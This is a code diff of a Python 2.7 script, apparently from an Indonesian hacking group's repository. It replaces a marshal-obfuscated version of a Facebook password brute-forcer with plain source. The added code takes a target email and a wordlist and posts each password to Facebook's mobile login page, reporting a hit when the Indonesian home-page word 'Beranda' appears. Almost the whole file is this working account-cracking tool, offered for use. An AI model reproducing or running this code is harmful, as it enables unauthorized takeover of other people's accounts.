@@ -1,8 +1,41 @@
-#recode berkeliaran ^^
-#tadinya biar pada belajar ^^
-#tapi di salah gunakan ^^
-#yaudah encrypt aja ^^
-#coded by TUANB4DUT
-
-import marshal
-exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00@\x00\x00\x00s\xdf\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00d\x02\x00GHd\x03\x00GHd\x04\x00GHd\x05\x00GHd\x06\x00GHd\x07\x00GHe\x02\x00d\x08\x00\x83\x01\x00Z\x03\x00d\t\x00Z\x04\x00e\x05\x00d\n\x00d\x0b\x00\x83\x02\x00j\x06\x00\x83\x00\x00Z\x07\x00x{\x00e\x07\x00D]s\x00Z\x08\x00e\x08\x00j\t\x00\x83\x00\x00Z\n\x00e\x00\x00j\x0b\x00e\x04\x00d\x0c\x00i\x03\x00e\x03\x00d\r\x006e\n\x00d\x0e\x006d\x0f\x00d\x10\x006\x83\x01\x01Z\x0c\x00e\x0c\x00j\r\x00Z\r\x00d\x11\x00e\r\x00k\x06\x00r\xce\x00d\x12\x00Ge\n\x00GHe\x01\x00j\x0e\x00d\x13\x00\x83\x01\x00\x01qd\x00d\x14\x00Ge\n\x00GHqd\x00Wd\x01\x00S(\x15\x00\x00\x00i\xff\xff\xff\xffNs8\x00\x00\x00\x1b[1;31;40m [ ====FACEBOOK BRUTEFORCE WITH WORDLIST==== ]s8\x00\x00\x00\x1b[1;31;40m [ ================TUANB4DUT================ ]s8\x00\x00\x00\x1b[1;31;40m [ =======https://github.com/TUANB4DUT====== ]s8\x00\x00\x00\x1b[1;37;40m [ ======INDONESIAN TERMUX ASSOCIATION====== ]s8\x00\x00\x00\x1b[1;37;40m [ ==============D35TR0Y SQUAD============== ]s:\x00\x00\x00\x1b[1;37;40m [ ================INDONESIA================== ]s0\x00\x00\x00\x1b[1;36;40mENTER THE TARGET FACEBOOK EMAIL / ID :s!\x00\x00\x00https://mobile.facebook.com/logins\x0c\x00\x00\x00wordlist.txtt\x01\x00\x00\x00rt\x04\x00\x00\x00datat\x05\x00\x00\x00emailt\x04\x00\x00\x00passt\x06\x00\x00\x00submitt\x05\x00\x00\x00logint\x07\x00\x00\x00Berandas\x1f\x00\x00\x00\x1b[1;32;40mPASSWORD  MATCH!!! =>i\x01\x00\x00\x00s\x1f\x00\x00\x00\x1b[1;31;40mPASSWORD NOT MATCH =>(\x0f\x00\x00\x00t\x08\x00\x00\x00requestst\x03\x00\x00\x00syst\t\x00\x00\x00raw_inputR\x02\x00\x00\x00t\x03\x00\x00\x00urlt\x04\x00\x00\x00opent\t\x00\x00\x00readlinest\x02\x00\x00\x00ext\x04\x00\x00\x00linet\x05\x00\x00\x00stript\x08\x00\x00\x00passwordt\x04\x00\x00\x00postt\x04\x00\x00\x00httpt\x07\x00\x00\x00contentt\x04\x00\x00\x00exit(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00<debby>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s$\x00\x00\x00\x0c\x01\x0c\x03\x05\x01\x05\x01\x05\x01\x05\x01\x05\x01\x05\x01\x0c\x02\x06\x01\x15\x02\r\x01\x0c\x01*\x01\t\x01\x0c\x01\t\x01\x10\x02'))
+#!/bin/env python2.7
+import os
+import sys
+import requests
+class Main:
+    def __init__(self,x,y):
+        self.email = x
+        self.url = 'https://m.facebook.com/login'
+        self.ex = open(y, 'r').readlines()
+    def main(self):
+        for line in self.ex:
+            password = line.strip()
+            http = requests.post(self.url, data={'email': self.email, 'pass': password, 'login': 'submit'})
+            content = http.content
+            if 'Beranda' in content:
+                print ('\x1b[1;32;40mPASSWORD => '+password+' [ benar ]')
+                sys.exit(1)
+            else:
+                print('\x1b[1;31;40mPASSWORD => '+password+' [ salah ]')
+try:
+    if os.system("ping -c 1 " + "google.com") == 0:
+        os.system("clear")
+        print ('\x1b[1;31;40m [ ======== FACEBOOK BRUTEFORCE WITH WORDLIST ======= ]')
+        print ('\x1b[1;31;40m [ ================ TUANB4DUT X QYWOK =============== ]')
+        print ('\x1b[1;31;40m [ ========== https://github.com/belajarqywok ======= ]')
+        print ('\x1b[1;37;40m [ =========== INDONESIAN TERMUX ASSOCIATION ======== ]')
+        print ('\x1b[1;37;40m [ ============= D35TR0Y SQUAD X QNETICS ============ ]')
+        print ('\x1b[1;37;40m [ ===================== INDONESIA ================== ]')
+        mail=sys.argv[1]
+        wfile=sys.argv[2]
+        if __name__ == '__main__':
+            Main(mail,wfile).main()
+    else:
+        os.system("clear")
+        print('\x1b[1;31;40mKoneksi internet anda bermasalah')
+except KeyboardInterrupt:
+    os.system("clear")
+    print('\x1b[1;31;40mKeluar dari program')
+except IndexError:
+    os.system("clear")
+    print("masukan nama email/wordlist terlebih dahulu")
